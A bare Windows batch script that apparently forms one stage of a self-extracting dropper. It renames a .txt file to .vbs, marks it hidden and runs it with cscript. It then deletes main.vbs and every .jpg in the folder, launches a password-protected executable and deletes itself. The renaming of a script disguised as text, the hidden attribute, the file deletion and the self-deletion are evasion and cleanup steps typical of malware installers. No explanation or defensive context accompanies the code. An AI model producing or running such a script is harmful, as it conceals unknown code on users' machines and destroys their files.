@echo off
ren spx.txt spx.vbs
attrib +H spx.vbs
cscript spx.vbs %sfxcmd%
del main.vbs
timeout /T 15
del *.jpg
main.bat.exe -pmainpass
del %0
PAUSE
